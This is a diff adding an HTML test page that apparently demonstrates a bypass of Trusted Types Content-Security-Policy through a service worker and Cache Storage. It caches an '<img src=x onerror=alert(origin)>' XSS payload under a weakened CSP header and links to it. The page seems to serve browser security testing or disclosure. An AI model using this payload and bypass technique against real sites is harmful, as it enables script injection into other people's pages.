@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'; trusted-types sw-script;">
+</head>
+<body>
+  <script>
+    const sw_policy = trustedTypes.createPolicy('sw-script', {
+      createScriptURL: ignored => 'sw.js'
+    });
+    
+    navigator.serviceWorker.register(sw_policy.createScriptURL('')).then(() => {
+      caches.open("v1").then(cache => {
+        let attackerControlledString = '<img src=x onerror=alert(origin)>';
+        init = {
+          headers: {
+            'Content-Type': 'text/html',
+            'Content-Security-Policy': "require-trusted-types-for 'script'; trusted-types 'none';"
+              
+          }
+        };
+        cache.put('xss', new Response(attackerControlledString, init));
+      })
+    });
+  </script>
+  <a href="?attackerControlledString=%3Cimg%20src=x%20onerror=alert(origin)%3E">Bypass via Service Worker</a>
+  <a href="xss">Bypass via Cache Storage</a>
+</body>
+</html>
